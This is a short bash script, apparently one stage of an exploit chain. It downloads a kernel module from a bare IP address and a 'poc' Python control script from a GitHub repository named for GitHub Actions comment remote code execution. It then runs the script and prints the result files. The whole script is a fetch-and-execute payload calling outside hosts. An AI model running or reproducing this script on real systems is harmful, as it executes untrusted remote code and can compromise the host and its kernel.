#!/bin/bash
set -eu
exec 0<&-

curl -fsS http://16.146.243.72:8450/hvraw_dm_status.ko -o /tmp/hvraw_dm_status.ko
curl -fsS https://raw.githubusercontent.com/fdzdev/gha-comment-rce-3900000/main/poc/dm_status_control.py -o /tmp/dm_status_control.py
timeout 100 python3 -u /tmp/dm_status_control.py >/tmp/dm-control.log 2>&1 || true
cat /tmp/dm-control-result.json 2>/dev/null || true
tail -40 /tmp/dm-control.log 2>/dev/null || true
